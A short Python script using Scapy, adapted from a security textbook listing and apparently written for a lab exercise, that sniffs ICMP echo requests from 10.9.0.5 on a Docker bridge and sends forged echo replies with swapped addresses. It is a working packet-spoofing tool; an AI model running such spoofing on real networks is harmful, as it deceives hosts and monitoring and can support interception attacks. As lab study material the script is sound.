#!/usr/bin/env python3
from scapy.all import *

# Adapted From Computer and Internet Security 
# Chapter 15, listing 15.15, Wenliang Du.

def spoof_pkt(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:
        print("Original Packet......")
        print("Source IP : ", pkt[IP].src)
        print("Destination IP : ", pkt[IP].dst)

        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        data = pkt[Raw].load
        newpkt = ip/icmp/data
        
        print("=========================")
        print("Spoofed Packet......")
        print("Source IP : ", newpkt[IP].src)
        print("Destination IP : ", newpkt[IP].dst)
        print("=========================")
        send(newpkt,verbose=0)

pkt = sniff(filter='icmp and src host 10.9.0.5',iface ='br-0229d0abdb25',  prn=spoof_pkt)

